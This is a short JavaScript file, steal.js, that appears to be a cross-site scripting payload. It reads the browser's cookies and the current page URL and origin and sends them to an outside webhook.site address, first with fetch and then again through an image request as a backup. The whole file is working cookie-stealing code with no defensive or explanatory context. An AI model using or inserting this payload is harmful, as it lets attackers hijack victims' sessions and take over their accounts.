// steal.js
export default function() {
    const cookie = document.cookie || "";
    const url = document.location.href;

    // Send cookies + other info
    fetch(`https://webhook.site/42ca471e-afcd-4b11-8135-17fb903360b2?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}&origin=${encodeURIComponent(location.origin)}`, {
        method: 'GET',
        mode: 'no-cors'
    }).catch(() => {});

    // Extra backup (in case fetch is blocked)
    new Image().src = `https://webhook.site/42ca471e-afcd-4b11-8135-17fb903360b2?c=${encodeURIComponent(cookie)}&u=${encodeURIComponent(url)}`;
}
